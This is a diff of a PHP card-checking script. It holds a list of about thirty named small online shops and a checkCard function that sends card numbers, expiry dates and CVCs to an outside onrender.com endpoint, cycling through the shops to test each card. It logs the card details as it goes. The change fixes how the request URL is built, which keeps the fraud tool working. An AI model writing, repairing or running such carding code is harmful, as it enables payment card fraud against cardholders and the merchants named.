@@ -12,40 +12,40 @@ function log_message($message) {
     file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
 }
 
-// List of available sites with https://
+// List of available sites (without https://)
  $sites = [
-    'https://candy-edventure.myshopify.com',
-    'https://jamielynnhome.myshopify.com',
-    'https://south-coast-baby-co.myshopify.com',
-    'https://holidayshopcloseouts.com',
-    'https://lavendersbakeshop.com',
-    'https://karensbodybeautiful.com',
-    'https://geekishglitterlacquer.com',
-    'https://theimprint.sg',
-    'https://caffeinacoffee.com',
-    'https://schoolsupplyboxes.com',
-    'https://shop-small-shop-handmade-llc-the-shop.myshopify.com',
-    'https://soavefaire.com',
-    'https://the-purple-door-9111.myshopify.com',
-    'https://shop.wildatheart.org',
-    'https://leannrimesstore.com',
-    'https://hookedonpickin.com',
-    'https://manisfest.com',
-    'https://thespinsterz.com',
-    'https://simbihaiti.com',
-    'https://allways99pr.com',
-    'https://ciamor.com',
-    'https://shop.juanpollo.com',
-    'https://shop.terrapinbeer.com',
-    'https://artpop.com',
-    'https://bauerproducts.com',
-    'https://darkroomgrowlabs.com',
-    'https://vegascarts.com',
-    'https://electronicsandbatteries.com',
-    'https://islandbookstore.com',
-    'https://threadcutterz.com',
-    'https://anseladams.org',
-    'https://reddirtbaitcompany.com'
+    'candy-edventure.myshopify.com',
+    'jamielynnhome.myshopify.com',
+    'south-coast-baby-co.myshopify.com',
+    'holidayshopcloseouts.com',
+    'lavendersbakeshop.com',
+    'karensbodybeautiful.com',
+    'geekishglitterlacquer.com',
+    'theimprint.sg',
+    'caffeinacoffee.com',
+    'schoolsupplyboxes.com',
+    'shop-small-shop-handmade-llc-the-shop.myshopify.com',
+    'soavefaire.com',
+    'the-purple-door-9111.myshopify.com',
+    'shop.wildatheart.org',
+    'leannrimesstore.com',
+    'hookedonpickin.com',
+    'manisfest.com',
+    'thespinsterz.com',
+    'simbihaiti.com',
+    'allways99pr.com',
+    'ciamor.com',
+    'shop.juanpollo.com',
+    'shop.terrapinbeer.com',
+    'artpop.com',
+    'bauerproducts.com',
+    'darkroomgrowlabs.com',
+    'vegascarts.com',
+    'electronicsandbatteries.com',
+    'islandbookstore.com',
+    'threadcutterz.com',
+    'anseladams.org',
+    'reddirtbaitcompany.com'
 ];
 
 // Keywords that indicate a site is dead
@@ -68,7 +68,8 @@ function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
     
     // Try each site until we get a valid response
     foreach ($sites as $site) {
-        $api_url = "https://rocks-mbs7.onrender.com/index.php?site=$site&cc=$encoded_cc";
+        // Construct the API URL properly with https://
+        $api_url = "https://rocks-mbs7.onrender.com/index.php?site=https://" . urlencode($site) . "&cc=" . $encoded_cc;
         log_message("Checking card: $card_details, URL: $api_url");
         
         for ($attempt = 0; $attempt <= $retry; $attempt++) {
